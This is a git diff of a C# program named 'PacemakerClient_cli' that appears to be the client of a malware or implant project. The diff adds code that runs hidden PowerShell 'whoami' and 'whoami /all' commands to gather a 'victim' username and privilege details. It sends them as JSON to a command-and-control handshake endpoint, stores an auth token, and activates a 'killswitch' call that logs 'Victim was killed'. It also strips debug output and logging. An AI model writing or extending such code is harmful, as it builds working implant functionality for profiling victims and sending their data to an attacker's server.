@@ -9,9 +9,16 @@ using System.Diagnostics;
 using Newtonsoft.Json;
 using PacemakerClient;
 using System.Runtime.Serialization.Formatters.Binary;
+using System.Threading;
 
 namespace PacemakerClient_cli
 {
+    public class VictimJson
+    {
+        public string victimName {  get; set; }
+        public string victimAdditionalinfo { get; set;}
+    }
+
     internal class Program
     {
         public static string server_hostname = "http://localhost:3000";
@@ -23,17 +30,21 @@ namespace PacemakerClient_cli
         {
             HttpClient Client = new HttpClient();
 
-            string victimName = "alskdjaldsk";
-            string victimAdditionalinfo = "dummy info";
+            VictimJson victimJson = new VictimJson
+            {
+                victimName = GetUserInfo("name"),
+                victimAdditionalinfo = GetUserInfo("description")
+            };
 
 
-            string jsonData = "{\"victimName\": \"" + victimName + "\", \"victimAdditionalinfo\": \"" + victimAdditionalinfo +"\"}";
+            string output = JsonConvert.SerializeObject(victimJson);
 
-            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");
+            var content = new StringContent(output, Encoding.UTF8, "application/json");
 
             var json = await Client.PutAsync(server_hostname + "/core/initialhandshake", content);
 
-            string jsonResponse = "";
+            string jsonResponse;
+
             if (json.IsSuccessStatusCode)
             {
                 jsonResponse = await json.Content.ReadAsStringAsync();
@@ -46,88 +57,87 @@ namespace PacemakerClient_cli
                 bf.Serialize(stream1, authObj);
                 stream1.Close();
 
-
-                Console.WriteLine(authObj.RefreshToken);
-                Console.WriteLine(jsonResponse);
             }
 
-            string fullPath = Environment.CurrentDirectory + "\\log.txt";
+            // string fullPath = Environment.CurrentDirectory + "\\log.txt";
 
-            using (StreamWriter writer = new StreamWriter(fullPath))
+            /* using (StreamWriter writer = new StreamWriter(fullPath))
             {
                 writer.WriteLine(json.ToString());
                 writer.WriteLine(jsonResponse.ToString());
-            }
+            }*/
 
         }
 
         public static string GetUserInfo(string option)
         {
-            string result;
+
+            Process process = new Process();
+            process.StartInfo.FileName = "powershell.exe";
+            process.StartInfo.RedirectStandardInput = true;
+            process.StartInfo.RedirectStandardOutput = false;
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            
 
             if (option == "name")
             {
-                Process process = new Process();
-                process.StartInfo.FileName = "cmd.exe";
-                process.StartInfo.RedirectStandardInput = true;
-                process.StartInfo.RedirectStandardOutput = true;
-                process.StartInfo.UseShellExecute = false;
                 process.Start();
-
-                process.StandardInput.WriteLine("whoami");
+                process.StandardInput.WriteLine("whoami > result.txt");
                 process.StandardInput.Flush();
                 process.StandardInput.Close();
                 process.WaitForExit();
-
-
-                result = process.StandardOutput.ReadToEnd();
-
-                Console.WriteLine(result);
-                Console.Write("Hit 1");
-                return result;
             }
             else
             {
-                Process process = new Process();
-                process.StartInfo.FileName = "cmd.exe";
-                process.StartInfo.RedirectStandardInput = true;
-                process.StartInfo.RedirectStandardOutput = true;
-                process.StartInfo.UseShellExecute = false;
                 process.Start();
-
-                process.StandardInput.WriteLine("whoami /all");
+                process.StandardInput.WriteLine("whoami /all > result.txt");
                 process.StandardInput.Flush();
                 process.StandardInput.Close();
                 process.WaitForExit();
+            }
 
+            if (File.Exists("result.txt"))
+            {
 
-                result = process.StandardOutput.ReadToEnd();
+                StreamReader sr = new StreamReader(Environment.CurrentDirectory + "\\result.txt");
+                // read everything from file
+                string result = sr.ReadToEnd();
 
-                Console.WriteLine(result);
-                Console.Write("Hit 2");
+                sr.Close();
+
                 return result;
+
+            }
+            else
+            {
+                return "result file not created !";
             }
         }
 
 
-       /* public async static Task KillSwitch()
+        public async static Task KillSwitch()
         {
             HttpClient Client = new HttpClient();
 
-            var json = await Client.DeleteAsync(server_hostname + "/core/killswitch");
+            string jsonData = "{\"username\": \"" + authObj.Username + "\", \"jwt-key\": \"" + authObj.JwtToken + "\"}";
 
-            Console.WriteLine(json);
+            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");
+
+            var json = await Client.PostAsync(server_hostname + "/core/killswitch", content);
 
             string fullPath = Environment.CurrentDirectory + "\\killed.txt";
 
             using (StreamWriter writer = new StreamWriter(fullPath))
             {
+                var jsonResponse = await json.Content.ReadAsStringAsync();
+                writer.WriteLine(jsonResponse.ToString());
                 writer.WriteLine(json.ToString());
+                writer.WriteLine("\n\nVictim was killed...");
             }
 
-            Console.WriteLine("Killed");
-
-        }*/
+            return;
+        }
 
         static async Task Main(string[] args)
         {
@@ -159,12 +169,14 @@ namespace PacemakerClient_cli
         
                 Console.WriteLine("Finished authenticating");
             }
+
+
+            Console.WriteLine("\nDoing something....\n");
+            Thread.Sleep(2000);
            
-           
-            // await KillSwitch();
+            await KillSwitch();
 
             Console.WriteLine("Done");
-            Console.ReadLine();
         }
     }
 }
